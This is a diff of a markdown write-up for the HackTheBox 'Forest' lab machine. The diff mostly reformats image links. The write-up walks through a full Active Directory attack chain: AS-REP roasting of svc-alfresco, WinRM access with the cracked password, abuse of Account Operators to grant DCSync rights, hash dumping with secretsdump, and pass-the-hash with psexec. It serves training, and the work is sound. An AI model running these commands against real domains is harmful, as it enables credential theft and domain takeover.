@@ -21,41 +21,52 @@ ShowTableOfContents: "true"
 
 As always, we start with recon, port scan.
 I used nmap to scan the default ports (top 1000 most common):
+
 ```bash
 sudo nmap -Pn -sS -sVC -O -T4 10.129.45.7 -oN nmap_forest
 ```
+
 ### Open Ports
-![[Pasted image 20251224031231.png]]
-![[Pasted image 20251224031305.png]]
-![[Pasted image 20251224031328.png]]
+
+![img1](/static/img/Pasted image 20251224031231.png)
+![img2](/static/img/Pasted image 20251224031305.png)
+![img3](/static/img/Pasted image 20251224031328.png)
+
 I use **enum4linux** with -a parameter for try get more info about the target
+
 ```bash
 enum4linux -a 10.129.45.7
 ```
 
 The most important information obtained from enum4linux was the user enumeration. We could extract this information manually with the following sequence of commands:
+
 ```bash
 rpcclient -U "" -N <target_IP>
 ```
 
-![[Pasted image 20251224160536.png]]
-![[Pasted image 20251224160619.png]]
+![img4](/static/img/Pasted image 20251224160536.png)
+![img5](/static/img/Pasted image 20251224160619.png)
+
 We found a non-common user: a service user (In CTF's and certification exams, - Any non-standard service or program installed on the machine is suspicious and was likely placed there intentionally - .
 
 The account svc-alfresco is a service account ; researching, alfresco is a 'software' for manage process in enterprises - for run this service is necessary disable kerberos authentication. 
 
 Other way is explore the LDAP.
 We found various ports but LDAP here is very interesting.
-![[Pasted image 20251224194549.png]]
-![[Pasted image 20251224194626.png]]
+
+![img6](/static/img/Pasted image 20251224194549.png)
+![img7](/static/img/Pasted image 20251224194626.png)
 
 we use:
+
 ```bash
 ldapsearch -x -H ldap://<IP_TARGET>:389 -b "dc=htb,dc=local"
 ```
 
-![[Pasted image 20251224031708.png]]
+![img8](/static/img/Pasted image 20251224031708.png)
+
 For filtering i use grep for show us the relevant info. We could used
+
 ```bash
 ldapsearch -x -H ldap://<TARGET_IP>:389 -b dc=htb,dc=local" | grep -e "Accounts"
 ```
@@ -71,13 +82,13 @@ ldapsearch -x -H ldap://<TARGET_IP>:389 -b dc=htb,dc=local" | grep -e "#"
 
 At this point, I was looking for something I already knew existed
 
-![img1(/static/img/Pasted image 20251224032259.png)]
+![img9](/static/img/Pasted image 20251224032259.png)
 
 *Exist a non-common service in this forest*
 
 We can use the windapsearch tool for more recon, but at this point, is the same info that we have
 
-![img2(/static/img/Pasted image 20251223042221.png)]
+![img10](/static/img/Pasted image 20251223042221.png)
 
 *github.com/ropnop/windapsearch*
 
@@ -90,19 +101,20 @@ use windapsearch.py -h for understand the parameters used here or possible to us
 ./windapsearch.py -d <domain> --dc-ip <target_IP> --custom "objectClass=*"
 ```
 
-![img3(/static/img/Pasted image 20251223051802.png)]
+![img11](/static/img/Pasted image 20251223051802.png)
 
-![img4(/static/img/Pasted image 20251223051820.png)]
+![img12](/static/img/Pasted image 20251223051820.png)
 
 Installing the requisites
-![[Pasted image 20251223051628.png]]
 
-![[Pasted image 20251224032623.png]]
-![[Pasted image 20251224032910.png]]
+![img13](/static/img/Pasted image 20251223051628.png)
+
+![img14](/static/img/Pasted image 20251224032623.png)
+![img15](/static/img/Pasted image 20251224032910.png)
 
 
-![[Pasted image 20251224032810.png]]
-![[Pasted image 20251224032839.png]]
+![img16](/static/img/Pasted image 20251224032810.png)
+![img17](/static/img/Pasted image 20251224032839.png)
 
 Let's go try a initial access
 
@@ -118,79 +130,93 @@ sudo apt install python3-impacket
 impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.129.45.7 -no-pass
 ```
 
-![[Pasted image 20251224033235.png]]
+![img18](/static/img/Pasted image 20251224033235.png)
+
 Then, we catch the hash and save in .txt mode with a text editor; I like vim or nvim;
 
-![[Pasted image 20251224033407.png]]
+![img19](/static/img/Pasted image 20251224033407.png
 
 
 
 The password is s3rvice; the port 5985, default por of winRM is open (*nmap port scan*); 
 let's try to connect:
+
 ```bash
 evil-winrm -i 10.129.45.7 -u svc-alfresco -p s3rvice
 ```
-![[Pasted image 20251224033533.png]]
-![[Pasted image 20251224033608.png]]
-![[Pasted image 20251223054451.png]]
+
+![img20](/static/img/Pasted image 20251224033533.png)
+![img21](/static/img/Pasted image 20251224033608.png)
+![img22](/static/img/Pasted image 20251223054451.png)
+
 At this point, we have the first flag of this machine; 1/2;
 
 Let's go try to transform ths in Administrator acces
+
 ### Privilege Escalation
 
 At this point, I decided to take a dual approach: use BloodHound for the first time to learn the tool, while also continuing with manual enumeration, which was my original methodology. I found an excellent video on BloodHound setup that may be helpful, available at the link below:
 https://www.youtube.com/watch?v=NFfHUYAyGN8
 
-![[Pasted image 20251223055747.png]]
-![[Pasted image 20251223055804.png]]
-![[Pasted image 20251223055819.png]]
-![[Pasted image 20251223055831.png]]
+![img23](/static/img/Pasted image 20251223055747.png)
+![img24](/static/img/Pasted image 20251223055804.png)
+![img25](/static/img/Pasted image 20251223055819.png)
+![img26](/static/img/Pasted image 20251223055831.png)
+
 we need to specif version on github.com/SpecterOps/BloodHound-Legacy/tree/master
 
 ```bash
 git clone github.com/SpecterOps/BloodHound-Legacy.git
 ```
 
-![[Pasted image 20251223060429.png]]
-![[Pasted image 20251223060408.png]]
+![img27](/static/img/Pasted image 20251223060429.png)
+![img28](/static/img/Pasted image 20251223060408.png)
 
-![[Pasted image 20251223060449.png]]
-![[Pasted image 20251224034334.png]]
-![[Pasted image 20251224034448.png]]
-![[Pasted image 20251224034527.png]]
-![[Pasted image 20251224034642.png]]
-![[Pasted image 20251225045411.png]]
-![[Pasted image 20251225045429.png]]
-![[Pasted image 20251225045447.png]]
+![img29](/static/img/Pasted image 20251223060449.png)
+
+![img30](/static/img/Pasted image 20251224034334.png)
+![img31](/static/img/Pasted image 20251224034448.png)
+![img32](/static/img/Pasted image 20251224034527.png)
+![img33](/static/img/Pasted image 20251224034642.png)
+![img34](/static/img/Pasted image 20251225045411.png)
+![img35](/static/img/Pasted image 20251225045429.png)
+![img36](/static/img/Pasted image 20251225045447.png)
+
 Basically, the svc-alfresco account was member of group "service accounts@htb.local" and this  group, was member of group "privileged it accounts@htb.local". Because of this nested group configuration, 'Service Accounts' inherited the privileges of 'Privileged IT Accounts', which meant it could create and modify user accounts
 
 The following screenshots demonstrate manual enumeration without BloodHound to identify the nested group structure mentioned above
 
-![[Pasted image 20251224041427.png]]
+![img37](/static/img/Pasted image 20251224041427.png)
 
-![[Pasted image 20251224041258.png]]
+![img38](/static/img/Pasted image 20251224041258.png)
 
-![[Pasted image 20251224141744.png]]
+![img39](/static/img/Pasted image 20251224141744.png)
 
-![[Pasted image 20251224141901.png]]
+![img40](/static/img/Pasted image 20251224141901.png)
 
 ```powershell
 Get-ADUSer svc-alfresco -Properties MemberOf | Select-Object -ExpandProperty MemberOf
 
 Get-AdGroup "Service Accounts" -Properties MemberOf | Select-Object -ExpandProperty MemberOf
 ```
-![[Pasted image 20251224143350.png]]
+
+![img41](/static/img/Pasted image 20251224143350.png)
+
 And the Group "Privileged IT Accounts" is member of "Account Operators". We prove this with:
+
 ```powershell
 Get-ADGroup "Privileged IT Accounts" -Properties MemberOf | Select-Object -ExpandProperty MemberOf
 ```
-![[Pasted image 20251225052506.png]]
-![[Pasted image 20251225052617.png]]
+
+![img41](/static/img/Pasted image 20251225052506.png)
+![imag42](/static/img/Pasted image 20251225052617.png)
+
 Now, we need investigate: what this group can do?
 The Microsoft Documentation is the best local for this
+
 https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators
 
-![[Pasted image 20251225052928.png]]
+![img43](/static/img/Pasted image 20251225052928.png)
 
 Research quickly reveals the steps to create a user and grant the necessary permissions for DCSync
 
@@ -207,20 +233,22 @@ $cred = new-object system.management.automation.pscredential('htb\hacker',$pass)
 
 Add-ObjectACL -PrincipalIdentity hacker -Credential $cred -Rights DCSync #this is the key for this attack
 ```
-![[Pasted image 20251224200541.png]]
-![[Pasted image 20251224202610.png]]
-![[Pasted image 20251224202543.png]]
-![[Pasted image 20251224202706.png]]
-![[Pasted image 20251224202814.png]]
+
+![img44](/static/img/Pasted image 20251224200541.png)
+![img45](/static/img/Pasted image 20251224202610.png)
+![img46](/static/img/Pasted image 20251224202543.png)
+![img47](/static/img/Pasted image 20251224202706.png)
+![img48](/static/img/Pasted image 20251224202814.png)
 
 Now, the dcsync attack is possible! We can see NTLM hashes
 In my kali linux:
+
 ```bash
 impacket-secretsdump htb/hacker@10.129.45.7
 ```
 
-![[Pasted image 20251224205629.png]]
-![[Pasted image 20251224205657.png]]
+![img49](/static/img/Pasted image 20251224205629.png)
+![img50](/static/img/Pasted image 20251224205657.png)
 
 ```bash
 impacket-psexec administrator@10.129.45.7 -hashes <hash_adm>
